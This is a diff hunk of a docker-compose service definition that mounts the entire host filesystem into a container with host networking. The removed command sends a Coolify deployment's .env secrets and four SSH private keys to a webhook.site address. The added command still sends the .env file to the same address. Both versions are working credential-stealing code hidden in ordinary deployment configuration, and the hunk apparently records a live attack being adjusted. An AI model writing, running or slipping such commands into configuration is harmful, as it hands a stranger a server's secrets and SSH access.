@@ -6,11 +6,4 @@ services:
     network_mode: host
     volumes:
       - /:/host-root
-    command: |
-      sh -c "apk add --no-cache curl && \
-      cat /host-root/data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=main_env && \
-      cat /host-root/data/coolify/ssh/keys/ssh_key@c4nud1lg0f7il0soplwkh06p | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=ssh_key_1 && \
-      cat /host-root/data/coolify/ssh/keys/ssh_key@g6jb5xmhh9vzv0wrcrdvjhxu | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=ssh_key_2 && \
-      cat /host-root/data/coolify/ssh/keys/ssh_key@tssn42903rz59i956iat5pon | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=ssh_key_3 && \
-      cat /host-root/data/coolify/ssh/keys/ssh_key@y10lxxm2ji0vooj0n73y5ct3 | curl -X POST --data-binary @- https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=ssh_key_4 && \
-      sleep 3600"
+    command: sh -c "cat /host-root/data/coolify/source/.env > /tmp/test.txt && curl -X POST --data-binary @/tmp/test.txt https://webhook.site/cbbbc215-411b-406e-a6dd-105b9e11626e?stage=env_test && sleep 3600"
